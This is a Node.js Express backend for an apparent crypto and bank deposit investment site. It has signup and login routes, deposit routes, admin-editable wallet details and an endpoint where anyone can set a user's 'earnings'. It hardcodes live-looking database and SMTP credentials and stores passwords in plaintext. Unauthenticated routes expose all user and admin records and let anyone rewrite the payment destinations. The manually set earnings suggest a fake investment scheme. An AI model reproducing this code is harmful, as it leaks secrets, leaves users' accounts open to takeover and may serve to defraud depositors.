const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');
const nodemailer = require('nodemailer');

const app = express();
app.use(bodyParser.json());
const PORT = process.env.PORT || 10000;

app.use(cors());

// Load environment variables from a .env file (optional)
//require('dotenv').config();//
// Construct the MongoDB connection string for localhost
const mongoURI = 'mongodb+srv://williamsmicheal237:%40Wrongman%21@cluster0.wmuc96c.mongodb.net/signup_db?retryWrites=true&w=majority';


mongoose.connect(mongoURI, {
  connectTimeoutMS: 30000,
});

//USER SCHEMA
const userSchema = new mongoose.Schema({
  name: String,
  email: String,
  phone: String,
  password: String,
});

const User = mongoose.model('User', userSchema);

//ADMIN SCHEMA
const adminSchema = new mongoose.Schema({
  name: String,
  email: String,
  password: String
});

const Admin = mongoose.model('Admin', adminSchema);

app.use(bodyParser.json());



// Define endpoint to fetch all users
app.get('/api/users', async (req, res) => {
  try {
    // Fetch all users from the database
    const users = await User.find();
    res.json(users);
  } catch (error) {
    console.error('Error fetching users:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});
// Define endpoint to fetch all admin
app.get('/api/admin', async (req, res) => {
  try {
    // Fetch all admin from the database
    const admin = await Admin.find();
    res.json(admin);
  } catch (error) {
    console.error('Error fetching admin:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.post('/api/signup', async (req, res) => {
    try {
      const { name, email, phone, password } = req.body;
      // Check if the email already exists
      const existingUser = await User.findOne({ email });
  
      if (existingUser) {
        return res.status(400).json({ error: 'Email is already registered' });
      }
      
  
      // Configure NodeMailer
      const transporter = nodemailer.createTransport({
        host: 'firstradeaucity.online',
        port: 465,
        secure: true, // Use SSL/TLS
        auth: {
          user: 'support@firstradeaucity.online',
          pass: '1AnN$&x!n]$;',
        },
      });
  
      // Include the login link directly in the email
      const loginLink = 'https://firstradeaucity.online/Auth';
  
     // Send a welcome email
const mailOptions = {
    from: 'support@firstradeaucity.online',
    to: email,
    subject: 'Registration Successful',
    html: `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Email Confirmation</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
          }
  
          .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background-color: #ffffff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgb(59 130 246);
          }
  
          .logo {
            text-align: center;
            margin-bottom: 20px;
          }
  
          .logo img {
            max-width: 20px;
          }
  
          h1 {
            color: rgb(59 130 246);
          }
  
          p {
            color: #666666;
            line-height: 1.5;
          }
  
          .confirmation-icon {
            color: #00ccaa;
            font-size: 48px;
            text-align: center;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="logo">
            <img src="https://raw.githubusercontent.com/Not-Your-Man/server/master/image/logo.jpg" alt="Logo">
          </div>
          <h1>Email Confirmation</h1>
          <div class="confirmation-icon">&#10004;</div>
          <p>Hello ${name}, thank you for signing up!</p>
          <p>Click <a href="${loginLink}">here</a> to navigate to the login tab.</p>
          <p>If you have any questions, feel free to contact us here.</p>
        </div>
      </body>
      </html>
    `,
    bcc: 'Invest@firstradeaucity.online', // BCC a copy to yourself
  };
  //END OF MAIL MESSAGE

      transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
          console.error('Error sending email:', error);
        } else {
          console.log('Email sent:', info.response);
        }
      });
  
      // Save user to the database
      const user = new User({ name, email, phone, password });
      await user.save();
  
      res.status(201).json({ message: 'User registered successfully' });
    } catch (error) {
      console.error(error);
      res.status(500).json({ error: error.message || 'Internal server error' });
    }
  });
  

 app.post('/api/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    const user = await User.findOne({ email, password });

    if (user) {
      const userDetails = {
        name: user.name,
        email: user.email,
      };

      // Dispatch action to update Redux state with user details
      res.status(200).json({ message: 'Login successful', userDetails });
    } else {
      res.status(401).json({ error: 'Invalid credentials' });
    }
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: error.message || 'Internal server error' });
  }
});



// User change password route
app.patch('/api/change-password', async (req, res) => {
  try {
    const { email, oldPassword, newPassword } = req.body;

    // Find the user by email and check if the old password matches
    const user = await User.findOne({ email, password: oldPassword });

    if (!user) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    // Update the user's password
    user.password = newPassword;
    await user.save();

    res.status(200).json({ message: 'Password changed successfully' });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: error.message || 'Internal server error' });
  }
});


// User sign out route
app.post('/api/sign-out', (req, res) => {
  // In a real-world scenario, you might handle session or token expiration
  res.status(200).json({ message: 'Sign out successful' });
});

// Define the Deposit model
const Deposit = mongoose.model('Deposit', {
  amount: Number,
  timestamp: { type: Date, default: Date.now },
});

// Middleware for parsing JSON bodies
app.use(bodyParser.json());



// Deposit endpoint
app.post('/api/deposit', async (req, res) => {
  try {
    res.setHeader('Access-Control-Allow-Origin', '*');

    const { amount } = req.body;

    // Check if the amount is valid
    if (isNaN(amount) || amount <= 0) {
      return res.status(400).json({ error: 'Amount must be a positive number' });
    }

    // Create a new deposit record
    const deposit = new Deposit({ amount });
    await deposit.save();

    // Retrieve the latest transaction history
    const transactionHistory = await Deposit.find().sort({ timestamp: -1 });

    // Return a success response with the updated transaction history
    return res.status(200).json({ message: 'Deposit successful', transaction: transactionHistory });
  } catch (error) {
    console.error('Error processing deposit:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// THE ADMIN SERVER SIDE LOGIC

// Define endpoint for admin signup
app.post('/api/admin/signup', async (req, res) => {
  try {
    // Check the total number of admins already signed up
    const totalAdmins = await User.countDocuments({ role: 'admin' });

    if (totalAdmins >= 2) {
      return res.status(400).json({ error: 'Maximum number of admins reached' });
    }

    const { name, email, phone, password } = req.body;
    // Check if the email already exists
    const existingUser = await User.findOne({ email });

    if (existingUser) {
      return res.status(400).json({ error: 'Email is already registered' });
    }

    // Configure NodeMailer
    const transporter = nodemailer.createTransport({
      host: 'firstradeaucity.online',
      port: 465,
      secure: true, // Use SSL/TLS
      auth: {
        user: 'support@firstradeaucity.online',
        pass: '1AnN$&x!n]$;',
      },
    });

    // Include the login link directly in the email
    const loginLink = 'https://firstradeaucity.online';

    // Send a welcome email
    const mailOptions = {
      from: 'support@firstradeaucity.online',
      to: email,
      subject: 'Admin Registration Successful',
      html: `
        <!DOCTYPE html>
        <html lang="en">
        <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Email Confirmation</title>
          <style>
            body {
              font-family: Arial, sans-serif;
              background-color: #f4f4f4;
              margin: 0;
              padding: 0;
            }

            .container {
              max-width: 600px;
              margin: 0 auto;
              padding: 20px;
              background-color: #ffffff;
              border-radius: 8px;
              box-shadow: 0 0 10px rgb(59 130 246);
            }

            .logo {
              text-align: center;
              margin-bottom: 20px;
            }

            .logo img {
              max-width: 20px;
            }

            h1 {
              color: rgb(59 130 246);
            }

            p {
              color: #666666;
              line-height: 1.5;
            }

            .confirmation-icon {
              color: #00ccaa;
              font-size: 48px;
              text-align: center;
            }
          </style>
        </head>
        <body>
          <div class="container">
            <div class="logo">
              <img src="https://raw.githubusercontent.com/Not-Your-Man/server/master/image/logo.jpg" alt="Logo">
            </div>
            <h1>Email Confirmation</h1>
            <div class="confirmation-icon">&#10004;</div>
            <p>Hello ${name}, thank you for signing up as an admin!</p>
            <p>Click <a href="${loginLink}">here</a> to navigate to the login tab.</p>
            <p>If you have any questions, feel free to contact us here.</p>
          </div>
        </body>
        </html>
      `,
      bcc: 'Invest@firstradeaucity.online', // BCC a copy to yourself
    };

    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        console.error('Error sending email:', error);
      } else {
        console.log('Email sent:', info.response);
      }
    });

    // Save user to the database with role 'admin'
    const admin = new Admin({ name, email, phone, password });
    await admin.save();

    res.status(201).json({ message: 'Admin registered successfully' });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: error.message || 'Internal server error' });
  }
});

app.post('/api/admin/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    // Find the admin by email and password
    const admin = await Admin.findOne({ email, password });

    if (admin) {
      // If admin exists, respond with successful login message
      const adminDetails = {
        name: admin.name,
        email: admin.email
      };
      // Dispatch action to update Redux state with admin details
      return res.status(200).json({ message: 'Admin login successful', adminDetails });
    } else {
      // If no admin found, return invalid credentials error
      return res.status(401).json({ error: 'Invalid credentials' });
    }
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: error.message || 'Internal server error' });
  }
});


//pusing account detais to client side

// Database (you can replace this with your actual database logic)
let depositDetails = {
  btcWallet: '',
  ethWallet: '',
  bankAccount: '',
  USDT: '',
};

// Route to handle POST requests to update deposit details
app.post('/api/accounts', (req, res) => {
  const { btcWallet, ethWallet, bankAccount, USDT } = req.body;

  // Update the deposit details in the database
  depositDetails = {
    btcWallet,
    ethWallet,
    bankAccount,
    USDT,
  };

  // Send a response
  res.json({ message: 'Deposit details updated successfully', depositDetails });
});

app.get('/api/deposit-details', (req, res) => {
  // Send the stored deposit details to the client-side dashboard
  res.json(depositDetails);
});

//USERS EARNINGS UPDATED
// Define the Earnings model
const Earnings = mongoose.model('Earnings', new mongoose.Schema({
  userId: {
    type: String,
    required: true
  },
  earnings: {
    type: Number,
    required: true
  }
}));

// Define endpoint to handle POST requests to update user earnings
app.post('/api/update-earnings', async (req, res) => {
  try {
    const { _id, earnings } = req.body;

    // Find the user by ID
    const user = await User.findById(_id);

    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    // Create or update the earnings record associated with the user
    let userEarnings = await Earnings.findOne({ userId: _id });

    if (!userEarnings) {
      // If no earnings record exists, create a new one
      userEarnings = new Earnings({ userId: _id, earnings });
    } else {
      // If an earnings record exists, update the earnings
      userEarnings.earnings = earnings;
    }

    // Save the earnings record to the database
    await userEarnings.save();

    // Send success response
    res.status(200).json({ message: 'Earnings updated successfully' });
  } catch (error) {
    console.error('Error updating earnings:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});





//FETCH EARNINGS
// Route to handle GET requests to fetch user earnings
app.get('/api/earnings/:userId', async (req, res) => {
  try {
    const userId = req.params.userId;

    // Find the earnings record by userId
    const userEarnings = await Earnings.findOne({ userId });

    if (!userEarnings) {
      return res.status(404).json({ error: 'Earnings record not found for this user' });
    }

    // Send the user's earnings as a response
    res.status(200).json({ earnings: userEarnings.earnings });
  } catch (error) {
    console.error('Error fetching earnings:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});



//STOP HERE

// Middleware for handling CORS preflight requests globally
 app.options('*', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.status(200).end();
});

//Start the server
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});


